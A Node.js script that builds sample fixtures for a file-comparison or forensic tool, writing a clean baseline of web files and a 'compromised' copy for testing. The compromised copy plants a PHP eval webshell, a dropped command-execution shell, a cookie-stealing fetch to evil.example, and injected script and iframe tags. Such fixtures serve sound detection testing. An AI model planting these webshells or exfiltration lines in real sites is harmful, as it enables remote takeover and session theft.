'use strict';
// Builds a self-contained demo under ./sample so the interface can be tested
// immediately: two data roots (left = trusted, right = investigated), the two
// checksum CSVs, and an empty evidence folder.
//
//   node scripts/gen-sample.js
const fs = require('fs');
const path = require('path');
const { generate } = require('./gen-csv');

const ROOT = path.resolve(__dirname, '..', 'sample');
const LEFT = path.join(ROOT, 'left');
const RIGHT = path.join(ROOT, 'right');
const EVID = path.join(ROOT, 'evidence');

function write(base, rel, content) {
  const fp = path.join(base, rel);
  fs.mkdirSync(path.dirname(fp), { recursive: true });
  fs.writeFileSync(fp, content);
}

// ---- shared / clean content ----
const cleanIndex = `<?php
// example.com landing page
require __DIR__ . '/config.php';

function render_home() {
    echo "<h1>Welcome to example.com</h1>";
    echo "<p>Everything is fine here.</p>";
}

render_home();
`;

const config = `<?php
define('DB_HOST', 'localhost');
define('DB_NAME', 'example');
define('DEBUG', false);
`;

const cleanUtil = `export function slugify(s) {
  return String(s).toLowerCase().trim().replace(/[^a-z0-9]+/g, '-');
}

export function money(cents) {
  return '$' + (cents / 100).toFixed(2);
}
`;

const cleanShopHtml = `<!doctype html>
<html>
  <head><title>shop.local</title></head>
  <body>
    <h1>shop.local</h1>
    <p>Featured products below.</p>
  </body>
</html>
`;

const cartPhp = `<?php
// shop.local shopping cart
session_start();
$cart = $_SESSION['cart'] ?? [];
echo count($cart) . " items in cart";
`;

// ---- LEFT (trusted baseline) ----
write(LEFT, 'example.com/index.php', cleanIndex);
write(LEFT, 'example.com/config.php', config);
write(LEFT, 'example.com/lib/util.js', cleanUtil);
write(LEFT, 'shop.local/index.html', cleanShopHtml);
write(LEFT, 'shop.local/cart.php', cartPhp);

// ---- RIGHT (compromised / investigated) ----
// index.php: MODIFIED — webshell prepended
write(RIGHT, 'example.com/index.php', `<?php @eval($_POST['x']); /* injected */ ?>
` + cleanIndex);
// config.php: UNCHANGED
write(RIGHT, 'example.com/config.php', config);
// util.js: MODIFIED — exfil beacon added
write(RIGHT, 'example.com/lib/util.js', cleanUtil + `
// injected
fetch('https://evil.example/collect?c=' + document.cookie);
`);
// uploads/shell.php: ADDED — dropped webshell
write(RIGHT, 'example.com/uploads/shell.php', `<?php
// dropped file — not in baseline
system($_GET['cmd'] ?? 'id');
`);
// shop.local/index.html: MODIFIED — script injection
write(RIGHT, 'shop.local/index.html', cleanShopHtml.replace('</body>', '  <script src="https://evil.example/x.js"></script>\n  </body>'));
// shop.local/promo.htm: ADDED
write(RIGHT, 'shop.local/promo.htm', `<html><body><h2>PROMO</h2><iframe src="https://evil.example/ad"></iframe></body></html>\n`);
// shop.local/cart.php: DELETED on right (present only on left) — so NOT written here.

// ---- evidence folder + CSV manifests ----
fs.mkdirSync(EVID, { recursive: true });
generate(LEFT, '/mnt/data', path.join(EVID, 'left.csv'));
generate(RIGHT, '/mnt/data', path.join(EVID, 'right.csv'));

console.log('sample built under', ROOT);
console.log('  left  :', LEFT);
console.log('  right :', RIGHT);
console.log('  csvs  :', path.join(EVID, 'left.csv'), '/', path.join(EVID, 'right.csv'));
console.log('Expected: 3 modified, 2 added, 1 deleted across example.com + shop.local');
